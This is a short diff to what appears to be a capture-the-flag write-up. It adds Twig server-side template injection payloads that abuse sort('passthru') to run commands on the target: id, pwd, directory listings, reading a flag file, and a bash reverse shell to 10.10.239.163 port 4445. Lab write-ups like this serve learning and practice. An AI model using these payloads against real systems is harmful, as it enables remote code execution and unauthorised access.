@@ -118,6 +118,14 @@ Press Submit and F5!!!
 We open a connection: ls, cd flags, ls, cat file.txt
 We have the other flag!!!
 
+{{['id',""]|sort('passthru')}}
+{{ ["bash -c 'exec bash -i >& /dev/tcp/10.10.239.163/4445 0>&1'", ""] | sort('passthru') }}
+{{['pwd',""]|sort('passthru')}}
+{{['ls -l /var/www/html',""]|sort('passthru')}}
+{{['ls /var/www/html/flags',""]|sort('passthru')}}
+{{['cat /var/www/html/flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
+
+
 
 
 
